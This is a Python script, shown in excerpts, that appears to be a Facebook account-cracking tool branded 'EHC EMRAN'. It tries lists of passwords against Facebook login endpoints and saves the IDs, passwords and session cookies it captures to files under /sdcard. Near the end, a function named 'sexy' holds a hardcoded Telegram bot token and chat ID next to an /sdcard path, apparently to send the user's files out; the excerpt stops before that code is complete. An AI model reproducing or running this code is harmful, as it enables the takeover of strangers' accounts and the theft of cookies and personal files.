...
{A}──────────────────────────────────────────────────
{G1}[{A}={G1}]{G1} OWNER    {A}:{G1} EHC EMRAN
{G1}[{A}={G2}]{G2} FACEBOOK {A}:{G2} EHC \_____:*\❷/3:)\⓿
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/EMRAN.txt');linex()
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{G1}[EMRAN-OK] {sid} | {ps} ")
                    open('/sdcard/EMRAN-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{M}[EMRAN-CP] {sid} | {ps} ")
                     open('/sdcard/EMRAN-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);swagb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={swagb};{ckkk}"
                    print(f"\r\r{G1}[EMRAN-OK] {sid} | {ps} ")
                    open('/sdcard/EMRAN-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[EMRAN-CP] {sid} | {ps} ")
...
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}[{A}EMRAN{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            ...
            if 'access_token' in q:
                ...
                print(f'\r\r{G1}[EMRAN-OK] {uid} | {pas}')
...
def sexy():
    ...
    bot_token = '6524696517:AAGorotamYsOsKFaAA2W6d2CUcqSdx2LwQc' 
    chat_id = '5561844347'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
